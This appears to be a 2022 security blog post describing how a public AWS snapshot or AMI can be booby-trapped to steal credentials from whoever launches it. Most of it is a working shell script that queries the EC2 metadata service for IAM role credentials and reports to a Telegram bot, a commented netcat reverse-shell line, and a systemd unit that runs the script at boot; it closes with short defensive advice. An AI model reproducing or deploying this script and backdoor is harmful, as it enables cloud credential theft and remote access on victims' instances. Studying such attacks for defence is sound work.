---
layout: post
title:  "Planting backdoors and stealing secrets if not crypto miners!"
date:   2022-05-20 20:18:00
categories: AWS-Security
---

Before deep diving in this article, I would like to share two awesome resources on the research done on EC2 snapshots/AMI's

1) [Finding Secrets In Publicly Exposed EBS Volumes - Ben Morris] [Defcon]

2) [Investigating malicious AMIs - Scott Piper] [Summit Route]

After going through the above articles, I wanted to know what if the snapshot/AMIs could just steal AWS keys/secrets or create backdoors,
as cryptominers were flagged and blocked by AWS.

I wrote a shell script steal_creds.sh to check if the IAM role is attached to the instance - if yes send credentials to my telegram bot.
Additionally added a command to get a reverse shell on my C2C server

{% highlight shell %}
#!/bin/sh
role=$(curl -s http://169.254.169.254/latest/meta-data/iam/info | grep -Eo 'instance-profile/([a-zA-Z.0-9.-]+)' | sed 's#instance-profile/##')
if [ -z "$role" ];
 then
  send=$(curl -s "https://api.telegram.org/bot1588xxxx:xxx/sendMessage?chat_id=-xxxxxxxx&text=no_IAM_roleattached");
else
 #not stealing any creds. Just quering to find if flagged by AWS
 creds=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$role)
 #just sending role_name back to telegram
 send=$(curl -s "https://api.telegram.org/bot1588xxxx:xxx/sendMessage?chat_id=-xxxxxxxx&text=&text=$role");
fi

#Just add your backdoor command here
#ex : nc -e /bin/sh <IP> <port>

{% endhighlight %}

And then create a unit file under /etc/systemd/system

{% highlight shell %}
[Unit]
Description=Steal creds systemd service.

[Service]
Type=simple
ExecStart=/bin/bash /mnt/steal_creds.sh

[Install]
WantedBy=multi-user.target
{% endhighlight %}


Finally just create a snapshot from the volume and you could also create an AMI from the snapshot. Make the snapshot and AMI both public and wait
for the pingback. I had left the snapshot and AMI public for more than a week and it hadn't been brought down by AWS.

**Learnings**

- Don't create EC2 instance from unknown AMIs or from unknown public snapshots as base volume (especially don't attach any IAM role)

- In case when direly needed, just attach the volume on the EC2 instance and mount the volume on a directory to perform analysis. Make sure the instance is
isolated and has no keys/roles attached to it.

[Defcon]: https://www.youtube.com/watch?v=-LGR63yCTts
[Summit Route]: https://summitroute.com/blog/2018/09/24/investigating_malicious_amis/
